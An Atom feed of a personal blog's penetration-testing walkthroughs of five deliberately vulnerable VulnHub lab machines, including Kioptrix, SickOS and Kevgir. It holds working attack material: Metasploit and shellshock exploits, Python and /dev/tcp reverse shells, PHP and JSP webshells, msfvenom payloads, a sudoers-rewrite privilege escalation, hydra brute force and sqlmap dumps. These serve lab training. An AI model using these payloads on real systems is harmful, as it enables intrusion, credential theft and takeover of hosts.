<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: vulhub | Bob1Bob2]]></title>
  <link href="http://wg135.github.io/blog/categories/vulhub/atom.xml" rel="self"/>
  <link href="http://wg135.github.io/"/>
  <updated>2016-06-06T15:01:54-05:00</updated>
  <id>http://wg135.github.io/</id>
  <author>
    <name><![CDATA[Bob1Bob2]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[vulhub-Kioptrix level 1]]></title>
    <link href="http://wg135.github.io/blog/2016/06/06/vulhub-kioptrix-level-1/"/>
    <updated>2016-06-06T09:21:18-05:00</updated>
    <id>http://wg135.github.io/blog/2016/06/06/vulhub-kioptrix-level-1</id>
    <content type="html"><![CDATA[<p>From <a href="From%20[Vulhub](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">Vulhub</a></p>

<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>nbtscab</li>
<li>enum4linux</li>
<li>Metasploit</li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>

<p><img src="/images/blog/vulhub/kioptrix1/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.79.182 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.79.180 -p-</code></p>

<p>Opening ports: 22, 111, 139, 80, 443, 1024.</p>

<p><img src="/images/blog/vulhub/kioptrix1/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>SMB Attack:</p>

<p>Looks like SMB service is on. Lets start nbtscan to exam SMB.</p>

<p><code>nbtscan 192.168.79.182</code></p>

<p><img src="/images/blog/vulhub/kioptrix1/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>use enum4linux to enumerate smb:</p>

<p><code>enum4linux  -a 192.168.79.182</code></p>

<p><img src="/images/blog/vulhub/kioptrix1/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>get the samba version</p>

<p>Now start Metasploit:</p>

<pre><code>msfconsole
use exploit/linux/samba/trans2open
set rhost 192.168.79.182
set payload generic/shell_reverse_tcp
exploit
</code></pre>

<p><img src="/images/blog/vulhub/kioptrix1/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>DONE SMB</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[sickos1.2]]></title>
    <link href="http://wg135.github.io/blog/2016/05/31/vulhub-sickos1-dot-2/"/>
    <updated>2016-05-31T13:08:16-05:00</updated>
    <id>http://wg135.github.io/blog/2016/05/31/vulhub-sickos1-dot-2</id>
    <content type="html"><![CDATA[<p>From <a href="From%20[Vulhub](https://www.vulnhub.com/entry/csharp-vulnjson,134/">Vulhub</a></p>

<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Nikto</li>
<li>Wfuzz</li>
<li>Curl</li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>

<p><img src="/images/blog/vulhub/sickos1.2/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.79.180 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.79.180 -p-</code></p>

<p>Looks like port 22 and port 80 are openning.</p>

<p><img src="/images/blog/vulhub/sickos1.2/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>Check the <a href="http://192.168.79.180">http://192.168.79.180</a></p>

<p><img src="/images/blog/vulhub/sickos1.2/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>Not excited.</p>

<p>use Nikto:</p>

<p><img src="/images/blog/vulhub/sickos1.2/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>Still nothing cool</p>

<p>try wfuzz:</p>

<pre><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.79.180/FUZZ 2&gt;/dev/null
</code></pre>

<p>find a test dir:</p>

<p><img src="/images/blog/vulhub/sickos1.2/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p><img src="/images/blog/vulhub/sickos1.2/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>next exam the HTTP options:</p>

<pre><code>curl -v -X OPTIONS http://192.168.79.180/test/
</code></pre>

<p><img src="/images/blog/vulhub/sickos1.2/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>looks like it supports PUT.</p>

<p>Now upload php reverse shell (I tried different ports, looks like only 443 port works):</p>

<pre><code>nmap -p80 192.168.79.180 --script http-put --script-args http-put.url='/test/shell.php',http-put.file='shell.php'
</code></pre>

<p><img src="/images/blog/vulhub/sickos1.2/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>now the shell is uploaded:</p>

<p><img src="/images/blog/vulhub/sickos1.2/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>get the reverse shell:</p>

<p><img src="/images/blog/vulhub/sickos1.2/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>A better php shell:</p>

<pre><code class="php">&lt;?php system($_GET["exec"]); ?&gt;
</code></pre>

<p>Upload this shell, and in brower:</p>

<pre><code>http://192.168.79.180/test/exec.php?exec=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.79.173",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
</code></pre>

<p>get the shell.</p>

<p>During enumeration step, I follow <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">g0tmi1k</a></p>

<p><code>ls -l /etc/cron.daily</code></p>

<p><img src="/images/blog/vulhub/sickos1.2/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>After enumeration, find the system has chkrootkit:</p>

<p><code>dpkg -l | grep chkrootkit</code></p>

<p>chkrootkit verions is 0.49 and it is vulnerable.</p>

<p><code>searchsploit chkrootkit</code></p>

<p><code>echo 'chmod 777 /etc/sudoers &amp;&amp; echo "www-data ALL=NOPASSWD: ALL" &gt;&gt; /etc/sudoers &amp;&amp; chmod 440 /etc/sudoers' &gt; /tmp/update</code></p>

<p>also need to change the privilages on the update file with chmod 777 and wait:</p>

<p><code>ls -al /etc/sudoers</code></p>

<p>try:</p>

<p><code>sudo su</code></p>

<p><img src="/images/blog/vulhub/sickos1.2/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>DONE</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[sickos:1.1]]></title>
    <link href="http://wg135.github.io/blog/2016/05/18/sickos-1-dot-1/"/>
    <updated>2016-05-18T12:50:37-05:00</updated>
    <id>http://wg135.github.io/blog/2016/05/18/sickos-1-dot-1</id>
    <content type="html"><![CDATA[<p>From <a href="https://www.vulnhub.com/entry/csharp-vulnjson,134/">Vulhub</a></p>

<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Metasploit</li>
<li>FoxyProxy</li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>

<p><img src="/images/blog/vulhub/sickos/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.79.178 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.79.178 -p-</code></p>

<p><img src="/images/blog/vulhub/sickos/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>Looks like port 22 and port 3218 are openning. Port 3218 is running Squid. open msfconsole, search squid. I found that:</p>

<p><img src="/images/blog/vulhub/sickos/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>Then use this module to scan the squid service:</p>

<p><img src="/images/blog/vulhub/sickos/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>Looks like port 80 is opened:</p>

<p><img src="/images/blog/vulhub/sickos/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>Use FoxyProxy add-on to configure proxy:</p>

<p><img src="/images/blog/vulhub/sickos/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>now visit <a href="http://192.168.79.178">http://192.168.79.178</a></p>

<p><img src="/images/blog/vulhub/sickos/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>now let&rsquo;s use nikto to scan the server:</p>

<pre><code>nikto -h localhost -useproxy http://192.168.79.178:3128
</code></pre>

<p><img src="/images/blog/vulhub/sickos/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>looks like there is a shellshock vuln</p>

<p>Let&rsquo;s test it:</p>

<pre><code>wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" -e use_proxy=on -e http_proxy=192.168.79.178:3128 "http://192.168.79.178/cgi-bin/status"
</code></pre>

<p><img src="/images/blog/vulhub/sickos/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>It works and looks  there is an account sickos.</p>

<p>Now lets setup reverse shell.</p>

<p>netcat-style shell access without netcat:</p>

<p><code>/bin/bash -i &gt; /dev/tcp/[yourip]/[port] 0&lt;&amp;1</code></p>

<p>in one terminal:</p>

<p><code>nc -nlvp 4444</code></p>

<p>in another terminal:</p>

<pre><code>wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/bash -i &gt; /dev/tcp/192.168.79.173/4444 0&lt;&amp;1" -e use_proxy=on -e http_proxy=192.168.79.178:3128 "http://192.168.79.178/cgi-bin/status"
</code></pre>

<p>get the shell:</p>

<p><img src="/images/blog/vulhub/sickos/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>After Enumeration, got a interesting file: <code>/var/www/wolfcms/config.php</code></p>

<p><img src="/images/blog/vulhub/sickos/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p>Looks like the password is <code>john@123</code></p>

<p>SSH to the target server as sickos and use this password:</p>

<p><img src="/images/blog/vulhub/sickos/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>Check sickos&rsquo;s privilege:</p>

<p><code>sudo -l</code></p>

<p><img src="/images/blog/vulhub/sickos/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>Looks like it can run as root</p>

<p><img src="/images/blog/vulhub/sickos/Selection_014.png" title="[title manually exploit [alt text]]" ></p>

<p>YES</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Csharp: VulnJson]]></title>
    <link href="http://wg135.github.io/blog/2016/05/05/csharp-vulnjson/"/>
    <updated>2016-05-05T15:44:32-05:00</updated>
    <id>http://wg135.github.io/blog/2016/05/05/csharp-vulnjson</id>
    <content type="html"><![CDATA[<p>From <a href="https://www.vulnhub.com/entry/csharp-vulnjson,134/">Vulhub</a></p>

<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Wfuzz</li>
<li>Burp</li>
<li>Sqlmap</li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>

<p><img src="/images/blog/vulhub/vulnjson/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.79.175 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.79.175 -p-</code></p>

<p><img src="/images/blog/vulhub/vulnjson/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>Use wfuzz to burte force hidden path of the server</p>

<pre><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.79.175/FUZZ 2&gt;/dev/null
</code></pre>

<p><img src="/images/blog/vulhub/vulnjson/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>looks like /bin is a hidden path. Lets check it.</p>

<p><img src="/images/blog/vulhub/vulnjson/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>Sqlmap tips</p>

<p>from <a href="https://vimeo.com/96799028">Marudhamaran Gunasekaran</a></p>

<pre><code>How do I test a log in protected website with sqlmap?
use the --cookie parameter / or capture the request, pass it on with the -r parameter / or use the --auth-type=ATYPE, --auth-cred=ACRED, and --auth-cert=ACERT parameters
How do I test a website with sqlmap that requires authentication?
use the --cookie parameter / or capture the request, pass it on with the -r parameter / or use the --auth-type=ATYPE, --auth-cred=ACRED, and --auth-cert=ACERT parameters
How do I test a website with sqlmap that uses JSON data?
automatically works with JSON
How do I test a website with sqlmap that uses XML data?
use the custom injection paramter pointer *
How do I test a website with sqlmap that uses SSL?
use the --force-ssl parameter
How do I tell sqlmap to try harder?
use the --level and --risk parameters
How do I automate a sql map scan?
use the --batch and --crawl 3
</code></pre>

<p>go to the <a href="http://192.168.79.175,">http://192.168.79.175,</a> then search the users and use burp to record the traffic.</p>

<p><img src="/images/blog/vulhub/vulnjson/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>Then click the traffic content in the burp and right click it and copy to file, name it as test.txt.</p>

<p><img src="/images/blog/vulhub/vulnjson/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>Then in the terminal, we try:</p>

<pre><code>sqlmap -r test.txt  --level 5 --risk 3 --threads 10 -p "username" --dump
</code></pre>

<p>since there is a parameter username in the post request, so we use that as a parameter for sqlmap</p>

<p><img src="/images/blog/vulhub/vulnjson/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>Now the sqlmap dump all items I created.</p>

<p>DONE</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[vulhub:kevgir1]]></title>
    <link href="http://wg135.github.io/blog/2016/05/02/vulhub-kevgir1/"/>
    <updated>2016-05-02T14:42:52-05:00</updated>
    <id>http://wg135.github.io/blog/2016/05/02/vulhub-kevgir1</id>
    <content type="html"><![CDATA[<p>From <a href="https://www.vulnhub.com/entry/kevgir-1,137/">Vulhub</a></p>

<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>hydra</li>
<li>msfvenom</li>
<li>joomscan</li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.79.174 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.79.174 -p-</code></p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>Let attack ftp now.</p>

<p><code>hydra -L ~/tools/SecLists/Usernames/top_shortlist.txt -P ~/tools/SecLists/Passwords/john.txt  -u  -s 25 192.168.79.174 ftp</code></p>

<p>get the user name and password</p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>try ssh using same username and password</p>

<p><code>ssh -p 1322 admin@192.168.79.174</code></p>

<p>FTP attack DONE</p>

<p>Now it is privilege escalation time</p>

<p><code>uname -a</code>, get the result:</p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p><code>searchsploit 14.04</code>
<img src="/images/blog/vulhub/kevgir1/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>try <code>/linux/local/37292.c</code>, copy it to /var/www/html/, use wget to download to target machine, then compile it.</p>

<p><code>gcc 37292.c -o attack -static</code>, then run <code>attack</code></p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_015.png" title="[title manually exploit [alt text]]" ></p>

<p>failed, now try harder.</p>

<p>In the searchsploit result, there is a 39166.c. Lets try this one.</p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_014.png" title="[title manually exploit [alt text]]" ></p>

<p>GET the ROOT!!</p>

<p>Now let&rsquo;s attack port 8080. Use nikto to scan it first.</p>

<p><code>nikto -h 192.168.79.174:8080</code></p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>We got the username and password for tomcat manager &hellip; good</p>

<p>log into the manager page and now we can upload webshell&hellip;.</p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>create webshell(from pentester lab, you may generate it using msfvenom)</p>

<p>```php index.jsp
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
&lt;%@ page import=&ldquo;java.io.*&rdquo; %>
&lt;%
   String cmd = request.getParameter(&ldquo;cmd&rdquo;);
   String output = &ldquo;&rdquo;;
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+&ldquo;</br>&rdquo;; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%></p>

<pre><%=output %></pre>


<pre><code>
now pack the webshell
</code></pre>

<p>mkdir webshell
cp index.jsp webshell</p>

<p>cd webshell
jar -cvf ../webshell.war *</p>

<p>```</p>

<p>now upload the webshell.war. After uploading, visit page  <code>192.168.79.174:8080/webshell/</code>.</p>

<p>get the shell</p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>Lets use msfvenom to create webshell</p>

<p><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.79.173 LPORT=4444 -f war &gt; webshell1.war</code></p>

<p>upload webshell1.war and setup netcat listening on port 4444. After connection is setup. do <code>python -c 'import pty; pty.spawn("/bin/bash")'</code></p>

<p>get the shell</p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>DONE for Tomcat</p>

<p>Now move to port 8081</p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_016.png" title="[title manually exploit [alt text]]" ></p>

<p>Its Joomla!.</p>

<p>use tool <code>joomscan</code> to scan it</p>

<p><code>joomscan -u http://192.168.79.174:8081</code></p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_017.png" title="[title manually exploit [alt text]]" ></p>

<p>get the version of joomla!</p>

<p>Now find out the vulnerability:</p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_019.png" title="[title manually exploit [alt text]]" ></p>

<p>follow the instructions of this vulnerability.</p>

<p>login as admin:</p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_020.png" title="[title manually exploit [alt text]]" ></p>

<p>create php reverse shell:</p>

<p><code>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.79.173 LPORT=6666 -e php/base64 -f raw &gt; shell.php</code></p>

<p>In Extension ->Template Manager, edit existing template. Copy the content of the shell.php to it and don&rsquo;t forgot to add &lt;?php and ?>.</p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_021.png" title="[title manually exploit [alt text]]" ></p>

<p>set up the netcat and preview the page. get the shell</p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_022.png" title="[title manually exploit [alt text]]" ></p>

<p>now lets try another php webshell</p>

<p><a href="https://github.com/wg135/webshell-1/blob/master/php/reverseshell-poc.txt">reverse shell from hacksys team</a></p>

<p><img src="/images/blog/vulhub/kevgir1/Selection_023.png" title="[title manually exploit [alt text]]" ></p>

<p><img src="/images/blog/vulhub/kevgir1/gameover.jpg" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
</feed>
